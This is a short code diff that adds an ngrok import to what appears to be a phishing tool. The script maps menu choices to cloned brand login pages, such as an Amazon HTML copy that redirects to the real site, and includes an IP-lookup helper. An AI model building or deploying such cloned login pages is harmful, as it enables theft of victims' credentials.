@@ -1,4 +1,5 @@
 from utils import print_welcome_message, get_ip_info
+import ngrok
 
 sites = {
     "1": {"name": "Amazon", "html": "amazon/amazon.html", "redirect": "https://amazon.com"},
